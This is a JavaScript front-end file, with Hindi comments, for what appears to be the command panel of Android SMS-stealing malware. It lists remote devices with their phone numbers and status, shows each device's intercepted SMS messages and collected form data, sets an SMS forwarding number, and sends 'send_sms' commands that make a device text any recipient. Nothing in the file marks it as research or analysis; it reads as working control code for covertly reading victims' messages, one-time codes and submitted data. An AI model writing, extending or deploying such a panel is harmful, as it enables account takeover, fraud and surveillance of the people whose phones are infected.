document.addEventListener('DOMContentLoaded', () => {
    const API_BASE_URL = '/api'; // Vercel पर यह अपने आप सही URL पर चला जाएगा

    // --- Element Selectors ---
    const adminPanel = document.getElementById('admin-panel');
    const deviceControlPanel = document.getElementById('device-control-panel');
    const formListPanel = document.getElementById('form-list-panel');
    const deviceListContainer = document.getElementById('device-list');
    const smsListContainer = document.getElementById('sms-list');
    const formListContainer = document.getElementById('form-list');
    const dialogOverlay = document.getElementById('dialog-overlay');
    const dialogBox = document.getElementById('dialog-box');

    let currentDeviceId = null;
    let refreshInterval;

    // --- Navigation ---
    const showAdminPanel = () => {
        adminPanel.style.display = 'block';
        deviceControlPanel.style.display = 'none';
        formListPanel.style.display = 'none';
        currentDeviceId = null;
        startAutoRefresh(fetchDevices);
    };

    const showDeviceControlPanel = (deviceId) => {
        adminPanel.style.display = 'none';
        deviceControlPanel.style.display = 'block';
        formListPanel.style.display = 'none';
        currentDeviceId = deviceId;
        document.getElementById('controlling-device-id').innerText = `Controlling: ${deviceId}`;
        startAutoRefresh(fetchSmsLogs);
    };
    
    const showFormListPanel = () => {
        adminPanel.style.display = 'none';
        deviceControlPanel.style.display = 'none';
        formListPanel.style.display = 'block';
        startAutoRefresh(fetchForms);
    };

    // --- API Calls ---
    const apiCall = async (endpoint, method = 'GET', body = null) => {
        try {
            const options = {
                method,
                headers: { 'Content-Type': 'application/json' },
            };
            if (body) {
                options.body = JSON.stringify(body);
            }
            const response = await fetch(`${API_BASE_URL}${endpoint}`, options);
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            // DELETE जैसे मेथड कोई बॉडी नहीं लौटाते
            if (method === 'DELETE' || response.status === 204) return { success: true };
            return await response.json();
        } catch (error) {
            console.error('API Call Error:', error);
            return { error: error.message };
        }
    };

    // --- Data Fetching and Rendering ---
    const fetchDevices = async () => {
        const devices = await apiCall('/devices');
        if (devices.error) return;

        deviceListContainer.innerHTML = ''; // Clear list
        devices.forEach(device => {
            const card = document.createElement('div');
            card.className = 'device-card';
            card.dataset.deviceId = device.device_id;
            card.innerHTML = `
                <div class="device-info">
                    <h3>${device.device_name || 'Unknown Device'}</h3>
                    <p>ID: ${device.device_id}</p>
                    <p>OS: ${device.os_version || 'N/A'}</p>
                    <p>Phone: ${device.phone_number || 'N/A'}</p>
                    <p>Battery: ${device.battery_level}%</p>
                </div>
                <div class="status-indicator">
                    <div class="status-dot ${device.is_online ? 'online' : 'offline'}"></div>
                    <span>${device.is_online ? 'Online' : 'Offline'}</span>
                    <span class="delete-icon" data-device-id="${device.device_id}">🗑️</span>
                </div>
            `;
            card.querySelector('.device-info').addEventListener('click', () => showDeviceControlPanel(device.device_id));
            card.querySelector('.delete-icon').addEventListener('click', (e) => {
                e.stopPropagation();
                showConfirmDialog('Delete this device and all its data?', () => deleteDevice(device.device_id));
            });
            deviceListContainer.appendChild(card);
        });
    };

    const fetchSmsLogs = async () => {
        if (!currentDeviceId) return;
        const smsLogs = await apiCall(`/device/${currentDeviceId}/sms`);
        if (smsLogs.error) return;
        
        smsListContainer.innerHTML = '';
        smsLogs.forEach(sms => {
            const item = document.createElement('div');
            item.className = 'sms-item';
            item.innerHTML = `
                <div>
                    <p><strong>From:</strong> ${sms.sender}</p>
                    <p>${sms.message_body}</p>
                    <p><small>${new Date(sms.received_at).toLocaleString()}</small></p>
                </div>
                <span class="delete-icon" data-sms-id="${sms.id}">🗑️</span>
            `;
            item.querySelector('.delete-icon').addEventListener('click', (e) => {
                 e.stopPropagation();
                 showConfirmDialog('Delete this SMS?', () => deleteSms(sms.id));
            });
            smsListContainer.appendChild(item);
        });
    };
    
    const fetchForms = async () => {
        if (!currentDeviceId) return;
        const forms = await apiCall(`/device/${currentDeviceId}/forms`);
        if (forms.error) return;
        
        formListContainer.innerHTML = '';
        forms.forEach(form => {
            const item = document.createElement('div');
            item.className = 'form-item';
            item.innerHTML = `
                <div>
                    <p>${form.custom_data.replace(/\n/g, '  
')}</p>
                    <p><small>${new Date(form.submitted_at).toLocaleString()}</small></p>
                </div>
            `;
            formListContainer.appendChild(item);
        });
    };

    // --- Actions ---
    const deleteDevice = async (deviceId) => {
        await apiCall(`/device/${deviceId}`, 'DELETE');
        fetchDevices(); // Refresh list
    };
    
    const deleteSms = async (smsId) => {
        await apiCall(`/sms/${smsId}`, 'DELETE');
        fetchSmsLogs(); // Refresh list
    };

    // --- Dialogs ---
    const showDialog = (content) => {
        dialogBox.innerHTML = content;
        dialogOverlay.style.display = 'flex';
    };

    const hideDialog = () => {
        dialogOverlay.style.display = 'none';
    };

    const showConfirmDialog = (message, onConfirm) => {
        showDialog(`
            <h3>Confirmation</h3>
            <p>${message}</p>
            <div class="dialog-buttons">
                <button id="btn-dialog-no" class="btn-cancel">NO</button>
                <button id="btn-dialog-yes">YES</button>
            </div>
        `);
        document.getElementById('btn-dialog-yes').onclick = () => {
            onConfirm();
            hideDialog();
        };
        document.getElementById('btn-dialog-no').onclick = hideDialog;
    };
    
    const showUpdateForwardingDialog = async () => {
        const config = await apiCall('/config/sms_forward');
        showDialog(`
            <h3>Update Forwarding Number</h3>
            <input type="text" id="input-forward-number" placeholder="Enter phone number" value="${config.forward_number || ''}">
            <div class="dialog-buttons">
                <button id="btn-dialog-cancel" class="btn-cancel">Cancel</button>
                <button id="btn-dialog-update">Update</button>
            </div>
        `);
        document.getElementById('btn-dialog-update').onclick = async () => {
            const number = document.getElementById('input-forward-number').value;
            await apiCall('/config/sms_forward', 'POST', { forward_number: number });
            hideDialog();
        };
        document.getElementById('btn-dialog-cancel').onclick = hideDialog;
    };
    
    const showSendSmsDialog = () => {
        showDialog(`
            <h3>Send SMS</h3>
            <input type="text" id="input-sms-number" placeholder="Recipient Phone Number">
            <textarea id="input-sms-message" placeholder="Your message..."></textarea>
            <div class="dialog-buttons">
                <button id="btn-dialog-cancel" class="btn-cancel">Cancel</button>
                <button id="btn-dialog-send">Send SMS</button>
            </div>
        `);
        document.getElementById('btn-dialog-send').onclick = async () => {
            const command = {
                device_id: currentDeviceId,
                command_type: 'send_sms',
                command_data: {
                    phone_number: document.getElementById('input-sms-number').value,
                    message: document.getElementById('input-sms-message').value,
                    sim_slot: 0 // Default to SIM 1
                }
            };
            await apiCall('/command/send', 'POST', command);
            hideDialog();
            alert('SMS command sent!');
        };
        document.getElementById('btn-dialog-cancel').onclick = hideDialog;
    };

    // --- Auto-Refresh ---
    const startAutoRefresh = (callback) => {
        clearInterval(refreshInterval); // Clear previous interval
        callback(); // Call immediately
        refreshInterval = setInterval(callback, 3000); // Refresh every 3 seconds
    };

    // --- Event Listeners ---
    document.getElementById('btn-update-forwarding').addEventListener('click', showUpdateForwardingDialog);
    document.getElementById('btn-send-sms').addEventListener('click', showSendSmsDialog);
    document.getElementById('btn-get-forms').addEventListener('click', showFormListPanel);
    document.getElementById('btn-back-to-admin').addEventListener('click', showAdminPanel);
    document.getElementById('btn-back-to-control').addEventListener('click', () => showDeviceControlPanel(currentDeviceId));
    dialogOverlay.addEventListener('click', (e) => {
        if (e.target === dialogOverlay) hideDialog();
    });

    // --- Initial Load ---
    showAdminPanel();
});
